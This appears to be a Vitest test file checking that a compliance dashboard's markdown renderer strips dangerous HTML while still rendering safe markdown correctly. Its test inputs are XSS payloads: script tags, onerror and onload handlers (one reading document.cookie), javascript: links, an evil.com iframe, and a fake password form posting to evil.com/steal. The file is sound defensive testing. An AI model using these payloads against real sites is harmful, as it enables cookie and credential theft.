import { describe, it, expect } from 'vitest'
import { render } from '@testing-library/react'
import ReactMarkdown from 'react-markdown'
import remarkGfm from 'remark-gfm'
import rehypeSanitize from 'rehype-sanitize'

/**
 * AC-2.5: Markdown <script> / <img onerror> → sanitized
 *
 * The compliance system detail page renders user-supplied markdown via
 * ReactMarkdown with rehype-sanitize plugin. This test verifies that
 * dangerous HTML is stripped while safe markdown renders normally.
 *
 * Mirrors production usage at:
 *   apps/web/src/app/dashboard/compliance/systems/[id]/page.tsx:548
 */

// Same config as production
function renderMarkdown(content: string): ReturnType<typeof render> {
  return render(
    <ReactMarkdown remarkPlugins={[remarkGfm]} rehypePlugins={[rehypeSanitize]}>
      {content}
    </ReactMarkdown>
  )
}

describe('AC-2.5: Markdown sanitization via rehype-sanitize', () => {
  // ── XSS payloads stripped ──────────────────────────────────────────

  it('should strip <script> tags from markdown', () => {
    const { container } = renderMarkdown(
      'Hello <script>alert("xss")</script> world'
    )

    // No <script> elements in DOM — the tag is stripped
    expect(container.querySelectorAll('script').length).toBe(0)
    // Text content should be safe (inner text may remain as text node, which is safe)
    expect(container.textContent).toContain('Hello')
    expect(container.textContent).toContain('world')
  })

  it('should strip <img onerror> handler from markdown', () => {
    const { container } = renderMarkdown(
      'Check this: <img src="x" onerror="alert(1)">'
    )

    // If img is rendered, it must NOT have onerror attribute
    const imgs = container.querySelectorAll('img')
    for (const img of imgs) {
      expect(img.getAttribute('onerror')).toBeNull()
    }

    // No script execution possible
    expect(container.querySelectorAll('script').length).toBe(0)
  })

  it('should strip <iframe> tags from markdown', () => {
    const { container } = renderMarkdown(
      '<iframe src="https://evil.com" style="position:fixed;top:0;left:0;width:100%;height:100%"></iframe>'
    )

    expect(container.querySelectorAll('iframe').length).toBe(0)
  })

  it('should strip <svg onload> from markdown', () => {
    const { container } = renderMarkdown(
      '<svg onload="alert(document.cookie)"><circle r="10"/></svg>'
    )

    // SVG should be stripped or sanitized
    const svgs = container.querySelectorAll('svg')
    for (const svg of svgs) {
      expect(svg.getAttribute('onload')).toBeNull()
    }
  })

  it('should strip <a href="javascript:"> links from markdown', () => {
    const { container } = renderMarkdown(
      '<a href="javascript:alert(1)">Click me</a>'
    )

    const links = container.querySelectorAll('a')
    for (const link of links) {
      const href = link.getAttribute('href') || ''
      expect(href).not.toMatch(/^javascript:/i)
    }
  })

  it('should strip <form> and <input> elements', () => {
    const { container } = renderMarkdown(
      '<form action="https://evil.com/steal"><input type="password" name="pw"><button>Login</button></form>'
    )

    expect(container.querySelectorAll('form').length).toBe(0)
    expect(container.querySelectorAll('input').length).toBe(0)
  })

  it('should strip style attributes that could hide overlay attacks', () => {
    const { container } = renderMarkdown(
      '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">Fake login</div>'
    )

    // Any rendered div should not have the dangerous style
    const divs = container.querySelectorAll('div')
    for (const div of divs) {
      expect(div.getAttribute('style')).toBeNull()
    }
  })

  // ── Safe markdown renders correctly ────────────────────────────────

  it('should render headings correctly', () => {
    const { container } = renderMarkdown('# Heading 1\n## Heading 2')

    expect(container.querySelector('h1')?.textContent).toBe('Heading 1')
    expect(container.querySelector('h2')?.textContent).toBe('Heading 2')
  })

  it('should render links with safe href', () => {
    const { container } = renderMarkdown(
      '[AgentGov](https://agentgov.io)'
    )

    const link = container.querySelector('a')
    expect(link).not.toBeNull()
    expect(link!.getAttribute('href')).toBe('https://agentgov.io')
    expect(link!.textContent).toBe('AgentGov')
  })

  it('should render lists correctly', () => {
    const { container } = renderMarkdown(
      '- Item A\n- Item B\n- Item C'
    )

    const items = container.querySelectorAll('li')
    expect(items.length).toBe(3)
  })

  it('should render GFM tables (via remark-gfm)', () => {
    const { container } = renderMarkdown(
      '| Header |\n|--------|\n| Cell   |'
    )

    expect(container.querySelector('table')).not.toBeNull()
    expect(container.querySelector('th')?.textContent).toBe('Header')
    expect(container.querySelector('td')?.textContent).toBe('Cell')
  })

  it('should render code blocks without executing them', () => {
    const { container } = renderMarkdown(
      '```javascript\nalert("not executed")\n```'
    )

    const code = container.querySelector('code')
    expect(code).not.toBeNull()
    expect(code!.textContent).toContain('alert("not executed")')
    // No script execution
    expect(container.querySelectorAll('script').length).toBe(0)
  })
})
